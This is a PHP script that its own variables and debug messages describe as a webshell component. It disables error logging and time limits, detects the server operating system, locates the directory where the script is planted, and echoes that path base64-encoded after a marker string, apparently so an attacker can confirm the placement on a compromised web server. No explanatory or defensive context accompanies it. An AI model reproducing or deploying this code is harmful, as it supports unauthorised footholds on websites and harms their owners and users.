$debug_mode = false;
@set_time_limit(0);
@error_reporting(7);
@ini_set('display_errors', 'On');
@ini_set('log_errors', 'Off');
@set_magic_quotes_runtime(0);
@ini_set("magic_quotes_runtime", 0);
if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ?
            array_map('stripslashes_deep', $value) :
            stripslashes($value);
        return $value;
    }

    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
if (strpos(strtolower(PHP_OS), 'win') !== FALSE) {
    if ($debug_mode) echo "debug: windows found: " . PHP_OS . "\n";
    $shindoshs = true;
} else {
    $shindoshs = false;
//    function getSystemMemInfo()
//    {
//        $data = explode("\n", file_get_contents("/proc/meminfo"));
//        $meminfo = array();
//        foreach ($data as $line) {
//            list($key, $val) = explode(":", $line);
//            $meminfo[$key] = trim($val);
//        }
//        return $meminfo;
//    }
}
if ($debug_mode) echo "debug: php version: " . phpversion() . " || date: " . date("Y-m-d H:i:s", time()) . "\n";
if ($debug_mode) echo "debug: memory peak usage " . (memory_get_peak_usage(true) / 1024) . " kB\n";

$current_domain = $_SERVER['SERVER_NAME'];
$path_parts = pathinfo($_SERVER['PHP_SELF']);
$paths = $path_parts['dirname'];
$shell_filename = getcwd() . DIRECTORY_SEPARATOR . $path_parts['basename'];
$shell_dir = dirname($shell_filename);
if ($debug_mode) echo "debug: webshell dir found: " . $shell_dir . "\n";

if (count($shell_dir) != "0") {
    $GLOBALS["rezultarray[1]"] = base64_encode($shell_dir);
    if ($debug_mode) echo "debug: base64 length: " . strlen($GLOBALS["rezultarray[1]"]) . "\n";
} else {
    if ($debug_mode) echo "debug: nothing found\n";
}

echo "rezult123123" . $GLOBALS["rezultarray[1]"];
